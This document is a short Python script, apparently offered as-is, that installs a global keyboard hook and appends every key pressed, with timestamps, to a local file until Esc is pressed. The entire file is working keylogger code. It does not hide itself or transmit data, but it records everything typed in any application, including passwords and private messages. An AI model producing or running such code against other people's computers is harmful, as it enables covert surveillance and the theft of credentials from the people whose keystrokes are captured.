import keyboard
import datetime

# Initialize variables
keystrokes = []

def save_keystrokes():
    if keystrokes:
        current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open('keystrokes.txt', 'a') as f:
            for key in keystrokes:
                f.write(f"{current_time} - {key}\n")
        keystrokes.clear()

def on_key(event):
    if event.event_type == keyboard.KEY_DOWN:  # Capture only key press events
        key = event.name
        keystrokes.append(key)
        if key == 'space' or key == 'enter':
            save_keystrokes()

# Hook the keyboard event
keyboard.hook(on_key)

try:
    keyboard.wait('esc')  # Wait for the user to press 'esc' to exit
except KeyboardInterrupt:
    pass
finally:
    save_keystrokes()  # Save any remaining keystrokes before exiting
    keyboard.unhook_all()  # Unhook the keyboard event
